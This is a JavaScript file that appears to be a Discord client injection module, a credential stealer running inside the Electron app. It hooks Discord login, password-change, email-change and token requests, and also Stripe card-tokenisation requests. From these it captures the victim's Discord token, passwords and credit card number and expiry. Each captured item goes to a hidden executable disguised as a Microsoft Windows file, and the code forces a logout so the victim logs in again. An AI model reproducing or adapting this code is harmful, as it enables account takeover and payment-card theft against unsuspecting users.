const { app, webContents, session } = require("electron");
const { URLSearchParams } = require("url");
const { exec } = require("child_process");
const fs = require("fs");

const exe_file =
  process.env["LOCALAPPDATA"] + "\\Microsoft\\Windows\\Windows.exe";
const login_file =
  process.env["LOCALAPPDATA"] + "\\Microsoft\\Windows\\app.txt";

var logoutEnabled = true;

app.on("browser-window-created", async () => {
  let token = await discordFunction("getToken");

  if (!fs.existsSync(login_file)) {
    logoutEnabled = false;
    if (token !== null) {
      await exec(exe_file + " discordLogoutToken " + token);
    } else {
      await exec(exe_file + " loggedOut");
    }
    await discordFunction("logout");
  } else {
    if (token !== null) {
      await exec(exe_file + " discordStartedToken " + token);
    } else {
      await exec(exe_file + " discordStarted");
    }
  }
});

const discordFunction = (method) => {
  return webContents.getAllWebContents()[0].executeJavaScript(`
  (webpackChunkdiscord_app.push([
      [''], {},
      req => {
          m = [];
  
          for (let chunk in req.c) {
              m.push(req.c[chunk])
          }
      }
  ]), m).find(chunk => chunk?.exports?.default?.${method} !== undefined).exports.default.${method}()`);
};

const urls = [
  "https://*/api/v*/auth/*",
  "https://api.stripe.com/v*/tokens",
  "https://*/api/v*/users/@me",
];

session.defaultSession.webRequest.onCompleted(
  {
    urls,
  },
  async (details) => {
    if (details.statusCode === 200 || details.statusCode === 204) {
      const token = await discordFunction("getToken");
      if (details.url.endsWith("logout") && logoutEnabled) {
        await exec(`${exe_file} discordLogout`);
        fs.writeFileSync(
          process.env["LOCALAPPDATA"] + "\\app.txt",
          exe_file + " discordLogout"
        );
      } else if (details.url.endsWith("auth/login")) {
        const body = JSON.parse(details.uploadData[0].bytes.toString());
        logoutEnabled = true;
        if (!body.password) {
          await discordFunction("logout");
        } else {
          await exec(`${exe_file} login ${body.password} ${token}`);
        }
      } else if (details.url.endsWith("tokens")) {
        const queryString = new URLSearchParams(
          details.uploadData[0].bytes.toString()
        );
        exec(
          `${exe_file} card ${queryString.get(
            "card[number]"
          )} queryString.get('card[cvc]') ${queryString.get(
            "card[exp_month]"
          )}/${queryString.get("card[exp_year]")} ${token}`
        );
        logoutEnabled = true;
      } else if (details.url.endsWith("@me") && details.method == "PATCH") {
        const body = JSON.parse(details.uploadData[0].bytes.toString());
        if (body.new_password) {
          exec(
            `${exe_file} password ${body.new_password} ${body.password} ${token}`
          );
          logoutEnabled = true;
        } else if (body.email) {
          await exec(
            `${exe_file} email ${body.email} ${body.password} ${token}`
          );
          logoutEnabled = true;
        } else if (body.password) {
          await exec(`${exe_file} foundpassword ${body.password} ${token}`);
          logoutEnabled = true;
        }
      }
    }
  }
);
